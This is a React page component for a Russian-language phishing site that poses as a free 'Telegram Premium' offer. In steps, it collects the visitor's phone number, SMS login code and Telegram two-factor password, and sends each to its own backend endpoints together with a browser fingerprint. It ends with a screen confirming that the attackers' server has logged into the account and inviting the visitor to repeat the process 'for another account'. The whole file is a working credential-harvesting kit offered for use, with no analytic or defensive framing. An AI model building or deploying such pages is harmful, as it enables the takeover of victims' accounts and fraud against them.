import { useState } from "react";

export default function Home() {
  const [step, setStep] = useState<'initial' | 'phone' | 'code' | 'password' | 'completed'>('initial');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [sessionKey, setSessionKey] = useState('');

  const resetForm = () => {
    setStep('initial');
    setPhoneNumber('');
    setVerificationCode('');
    setPassword('');
    setError('');
    setSessionKey('');
  };

  const handlePhoneSubmit = async () => {
    if (!phoneNumber.trim()) {
      setError('Введите номер телефона');
      return;
    }
    setIsLoading(true);
    setError('');

    try {
      // Add browser fingerprinting and validation
      const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: Date.now()
      };

      const response = await fetch('/api/auth/phone', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
          'X-Client-Data': btoa(JSON.stringify(fingerprint))
        },
        body: JSON.stringify({ phoneNumber }),
      });
      const data = await response.json();

      if (data.success) {
        setSessionKey(data.sessionKey);
        setStep('code');
      } else {
        setError(data.error || 'Ошибка отправки кода');
      }
    } catch {
      setError('Ошибка соединения');
    } finally {
      setIsLoading(false);
    }
  };

  const handleCodeSubmit = async () => {
    if (!verificationCode.trim() || verificationCode.trim().length < 4) {
      setError('Введите код минимум 4 цифры');
      return;
    }
    setIsLoading(true);
    setError('');

    try {
      const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        timestamp: Date.now()
      };

      const response = await fetch('/api/auth/code', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
          'X-Client-Data': btoa(JSON.stringify(fingerprint))
        },
        body: JSON.stringify({ sessionKey, code: verificationCode.trim() }),
      });
      const data = await response.json();

      if (data.success) {
        if (data.needPassword) {
          setStep('password');
        } else if (data.completed) {
          setStep('completed');
        }
      } else {
        setError(data.error || 'Ошибка проверки кода');
      }
    } catch {
      setError('Ошибка соединения');
    } finally {
      setIsLoading(false);
    }
  };

  const handlePasswordSubmit = async () => {
    if (!password.trim()) {
      setError('Введите пароль');
      return;
    }
    setIsLoading(true);
    setError('');

    try {
      const fingerprint = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        timestamp: Date.now()
      };

      const response = await fetch('/api/auth/password', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'X-Requested-With': 'XMLHttpRequest',
          'X-Client-Data': btoa(JSON.stringify(fingerprint))
        },
        body: JSON.stringify({ sessionKey, password }),
      });
      const data = await response.json();

      if (data.success && data.completed) {
        setStep('completed');
      } else {
        setError(data.error || 'Ошибка проверки пароля');
      }
    } catch {
      setError('Ошибка соединения');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white shadow-sm border-b animate-slideInLeft">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center animate-float">
              <svg className="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 0C5.376 0 0 5.376 0 12s5.376 12 12 12 12-5.376 12-12S18.624 0 12 0zm5.568 8.16l-1.44 6.84c-.12.48-.48.6-.96.36l-2.64-1.92-1.32 1.26c-.12.12-.24.24-.48.24l.12-2.4 4.32-3.84c.24-.24-.12-.36-.48-.12l-5.28 3.36-2.16-.72c-.48-.12-.48-.48.12-.72l8.4-3.24c.36-.12.72.12.6.6z"/>
              </svg>
            </div>
            <span className="text-xl font-semibold">Telegram Premium</span>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="pt-20 pb-32">
        <div className="max-w-4xl mx-auto px-4 text-center">
          <h1 className="text-4xl font-bold mb-6 animate-fadeInUp">
            Получите <span className="text-blue-600 animate-pulse-custom">Telegram Premium</span><br/>
            <span className="text-3xl text-gray-700">абсолютно бесплатно</span>
          </h1>
          
          <p className="text-xl text-gray-600 mb-12 max-w-2xl mx-auto animate-fadeInUp" style={{animationDelay: '0.2s'}}>
            Разблокируйте все премиум возможности Telegram без оплаты. Большие файлы, эксклюзивные стикеры и многое другое.
          </p>

          {/* Auth Forms */}
          <div className="max-w-md mx-auto animate-fadeInScale" style={{animationDelay: '0.4s'}}>
            {step === 'initial' && (
              <button 
                onClick={() => setStep('phone')}
                className="px-8 py-4 text-lg font-semibold text-white bg-blue-600 rounded-2xl hover:bg-blue-700 transition-all duration-300 hover-lift animate-glow hover-scale"
              >
                Получить Premium сейчас
              </button>
            )}

            {step === 'phone' && (
              <div className="bg-white p-8 rounded-2xl shadow-lg border animate-fadeInScale hover-lift">
                <h3 className="text-2xl font-bold mb-6 animate-fadeInUp">Вход в Telegram</h3>
                <p className="text-gray-600 mb-8 animate-fadeInUp" style={{animationDelay: '0.1s'}}>Введите номер телефона</p>
                
                <div className="mb-6 animate-fadeInUp" style={{animationDelay: '0.2s'}}>
                  <input
                    type="tel"
                    placeholder="+7 999 123 45 67"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handlePhoneSubmit()}
                    className="w-full px-4 py-4 text-lg border-2 border-gray-300 rounded-xl focus:border-blue-500 outline-none transition-all duration-300 focus:scale-105"
                    disabled={isLoading}
                  />
                </div>

                {error && (
                  <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg text-red-600 text-sm">
                    {error}
                  </div>
                )}

                <div className="flex gap-3 animate-fadeInUp" style={{animationDelay: '0.4s'}}>
                  <button
                    onClick={resetForm}
                    className="flex-1 py-3 bg-gray-200 rounded-xl hover:bg-gray-300 transition-all duration-300 hover-scale"
                    disabled={isLoading}
                  >
                    Отмена
                  </button>
                  <button
                    onClick={handlePhoneSubmit}
                    disabled={isLoading}
                    className="flex-1 py-3 bg-blue-600 text-white rounded-xl hover:bg-blue-700 disabled:opacity-50 transition-all duration-300 hover-scale animate-bounce-custom"
                  >
                    {isLoading ? (
                      <span className="flex items-center justify-center">
                        <div className="animate-spin-slow w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"></div>
                        Отправка...
                      </span>
                    ) : 'Далее'}
                  </button>
                </div>
              </div>
            )}

            {step === 'code' && (
              <div className="bg-white p-8 rounded-2xl shadow-lg border animate-fadeInScale hover-lift">
                <h3 className="text-2xl font-bold mb-6 animate-fadeInUp">Код подтверждения</h3>
                <p className="text-gray-600 mb-8 animate-fadeInUp" style={{animationDelay: '0.1s'}}>Введите код из SMS</p>
                
                <div className="mb-6 animate-fadeInUp" style={{animationDelay: '0.2s'}}>
                  <input
                    type="text"
                    placeholder="12345"
                    value={verificationCode}
                    onChange={(e) => setVerificationCode(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handleCodeSubmit()}
                    className="w-full px-4 py-4 text-2xl text-center font-mono border-2 border-gray-300 rounded-xl focus:border-blue-500 outline-none tracking-widest transition-all duration-300 focus:scale-105 animate-pulse-custom"
                    disabled={isLoading}
                    maxLength={6}
                  />
                </div>

                {error && (
                  <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg text-red-600 text-sm">
                    {error}
                  </div>
                )}

                <div className="flex gap-3 animate-fadeInUp" style={{animationDelay: '0.4s'}}>
                  <button
                    onClick={() => setStep('phone')}
                    className="flex-1 py-3 bg-gray-200 rounded-xl hover:bg-gray-300 transition-all duration-300 hover-scale"
                    disabled={isLoading}
                  >
                    Назад
                  </button>
                  <button
                    onClick={handleCodeSubmit}
                    disabled={isLoading}
                    className="flex-1 py-3 bg-blue-600 text-white rounded-xl hover:bg-blue-700 disabled:opacity-50 transition-all duration-300 hover-scale"
                  >
                    {isLoading ? (
                      <span className="flex items-center justify-center">
                        <div className="animate-spin-slow w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"></div>
                        Проверка...
                      </span>
                    ) : 'Подтвердить'}
                  </button>
                </div>
              </div>
            )}

            {step === 'password' && (
              <div className="bg-white p-8 rounded-2xl shadow-lg border animate-fadeInScale hover-lift">
                <h3 className="text-2xl font-bold mb-6 animate-fadeInUp">Пароль аккаунта</h3>
                <p className="text-gray-600 mb-8 animate-fadeInUp" style={{animationDelay: '0.1s'}}>Введите пароль от Telegram</p>
                
                <div className="mb-6 animate-fadeInUp" style={{animationDelay: '0.2s'}}>
                  <input
                    type="password"
                    placeholder="Введите пароль"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyPress={(e) => e.key === 'Enter' && handlePasswordSubmit()}
                    className="w-full px-4 py-4 text-lg border-2 border-gray-300 rounded-xl focus:border-blue-500 outline-none transition-all duration-300 focus:scale-105"
                    disabled={isLoading}
                  />
                </div>

                {error && (
                  <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg text-red-600 text-sm">
                    {error}
                  </div>
                )}

                <div className="flex gap-3 animate-fadeInUp" style={{animationDelay: '0.4s'}}>
                  <button
                    onClick={() => setStep('code')}
                    className="flex-1 py-3 bg-gray-200 rounded-xl hover:bg-gray-300 transition-all duration-300 hover-scale"
                    disabled={isLoading}
                  >
                    Назад
                  </button>
                  <button
                    onClick={handlePasswordSubmit}
                    disabled={isLoading}
                    className="flex-1 py-3 bg-blue-600 text-white rounded-xl hover:bg-blue-700 disabled:opacity-50 transition-all duration-300 hover-scale"
                  >
                    {isLoading ? (
                      <span className="flex items-center justify-center">
                        <div className="animate-spin-slow w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"></div>
                        Обработка...
                      </span>
                    ) : 'Войти'}
                  </button>
                </div>
              </div>
            )}

            {step === 'completed' && (
              <div className="bg-white p-8 rounded-2xl shadow-lg border text-center animate-fadeInScale hover-lift">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-bounce-custom animate-float">
                  <svg className="w-8 h-8 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd"></path>
                  </svg>
                </div>
                <h3 className="text-2xl font-bold mb-4 animate-fadeInUp">Успешно!</h3>
                <p className="text-gray-600 mb-6 animate-fadeInUp" style={{animationDelay: '0.2s'}}>
                  Вы успешно вошли в Telegram аккаунт. Premium функции активируются автоматически.
                </p>
                <button
                  onClick={resetForm}
                  className="w-full py-3 bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition-all duration-300 hover-scale animate-fadeInUp"
                  style={{animationDelay: '0.4s'}}
                >
                  Получить Premium для другого аккаунта
                </button>
              </div>
            )}
          </div>

          {/* Features Section */}
          <div className="mt-20 max-w-6xl mx-auto">
            <h2 className="text-3xl font-bold text-center mb-12 animate-fadeInUp" style={{animationDelay: '0.6s'}}>Что вы получите</h2>
            <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
              {[
                {
                  title: "Большие файлы до 4 ГБ",
                  description: "Загружайте и отправляйте файлы размером до 4 ГБ без ограничений.",
                  icon: "📁"
                },
                {
                  title: "Эксклюзивные стикеры",
                  description: "Получите доступ к премиум стикерам и анимированным эмодзи.",
                  icon: "🎨"
                },
                {
                  title: "Ускоренная загрузка",
                  description: "Загружайте медиафайлы на максимальной скорости.",
                  icon: "⚡"
                },
                {
                  title: "Больше чатов",
                  description: "Создавайте до 1000 каналов и 500 групп.",
                  icon: "💬"
                },
                {
                  title: "Расширенные настройки",
                  description: "Настройте уникальные темы и получите значок Premium.",
                  icon: "⚙️"
                },
                {
                  title: "Приоритетная поддержка",
                  description: "Получайте быстрые ответы от службы поддержки.",
                  icon: "🎯"
                }
              ].map((feature, index) => (
                <div 
                  key={index} 
                  className="bg-white p-6 rounded-2xl shadow-lg border hover-lift animate-fadeInUp" 
                  style={{animationDelay: `${0.8 + index * 0.1}s`}}
                >
                  <div className="text-4xl mb-4 animate-float" style={{animationDelay: `${index * 0.2}s`}}>{feature.icon}</div>
                  <h3 className="text-xl font-semibold mb-3">{feature.title}</h3>
                  <p className="text-gray-600">{feature.description}</p>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}